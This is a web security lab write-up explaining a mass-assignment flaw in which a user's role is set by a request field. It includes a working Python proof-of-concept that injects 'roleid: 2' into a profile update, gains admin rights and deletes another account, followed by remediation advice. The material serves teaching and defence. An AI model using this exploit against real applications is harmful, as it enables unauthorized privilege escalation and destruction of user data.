# Mass Assignment / User Role Controlled by Request Parameter — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-07-28

## The Problem

The application exposed a `roleid` field in server responses (e.g. when loading the user's own profile data), and — critically — also accepted that same field back when the user submitted a profile update (like changing their email). The server never restricted which fields a normal user was allowed to modify; it simply took whatever fields were present in the request and applied them, including ones the UI never intended to expose for editing.

This flaw is commonly known as **Mass Assignment**: the server "mass-updates" every field it receives instead of only updating an explicitly allowed (whitelisted) set of fields.

## Discovery / Exploitation

1. Log in as a normal, low-privileged user (`wiener` / `peter`)
2. View a request/response that includes the user's own data and notice a `roleid` field (e.g. `roleid: 1`) — a value not normally shown or editable in the UI
3. Send a legitimate-looking profile update request (e.g. changing the email), but add the extra field `roleid: 2` to the request body
4. The server accepts the extra field with no validation and updates the role — since `2` is a reasonable next value to try after seeing `1`
5. The account now has elevated (admin) privileges, confirmed by being able to reach and use admin-only functionality (e.g. deleting another user, `carlos`)

## Impact

Any authenticated user can escalate their own privileges to admin simply by adding an undocumented field to a legitimate request — with no real authorization check. This is a critical vertical privilege escalation vulnerability, made easier here because the original role value was itself leaked in an earlier server response, making the target field and its numbering scheme easy to spot and guess.

## Proof of Concept (Python)

This script logs in as the low-privileged user, submits a profile update request with a tampered `roleid`, and then attempts a privileged action (deleting another user) to confirm the escalation worked.

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(s, url):
    login_url = url + "/login"
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, proxies=proxies, verify=False, data=data_login)
    res = r.text

    if "logout" in res:
        print("(+) login successful")

        change_email = url + "/my-account/change-email"
        data_role_change = {"email": "hello@gmail.com", "roleid": 2}
        r = s.post(change_email, json=data_role_change, verify=False, proxies=proxies)
        res = r.text

        if "admin" in res:
            print("(+) successful change of roleid")

            delete_url = url + "/admin/delete?username=carlos"
            r = s.get(delete_url, verify=False, proxies=proxies)

            if r.status_code == 200:
                print("(+) successfully deleted")
            else:
                print("(-) could not delete")
                sys.exit(-1)
        else:
            print("(-) failed to change role")
            sys.exit(-1)
    else:
        print("(-) login failed")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print('(+) usage: %s <url>' % sys.argv[0])
        sys.exit()

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Logs in as the normal user and confirms success by checking for "logout" in the response
2. Sends a profile update request that legitimately changes the email, but sneaks in `roleid: 2` alongside it
3. Checks the response for the word "admin" to confirm the role change took effect
4. Attempts a privileged action (deleting `carlos`) to prove the elevated role is now functional, not just cosmetic

## Remediation

The server must use an explicit **whitelist** of fields a normal user is allowed to modify on their own profile (e.g. `email`, `name`). Any field not on that list — especially privilege-related fields like `roleid` — must be rejected or silently ignored, regardless of what the client sends.

Additionally, the server should avoid leaking internal fields like `roleid` in responses at all unless the client genuinely needs them — reducing what an attacker can discover and target in the first place.

## Takeaway

This is a fourth variation of the same underlying pattern across these labs — the server relies on client-controllable data to decide privilege, instead of enforcing it entirely server-side:

| Lab | Where the flaw lived | How it was found |
|---|---|---|
| 1 | Predictable admin URL | Guessed directly in the browser |
| 2 | Leaked in client-side JavaScript | Viewed page source |
| 3 | A client-supplied cookie value | Intercepted and tampered with Burp |
| 4 | An unrestricted field accepted on profile update | Spotted a leaked field in a response, then replayed it in a write request |

The consistent lesson: **never trust client-supplied data to determine privilege** — not in a URL, not in JavaScript, not in a cookie, and not in a request body field. Every privilege decision must be verified against a trusted, server-side source.
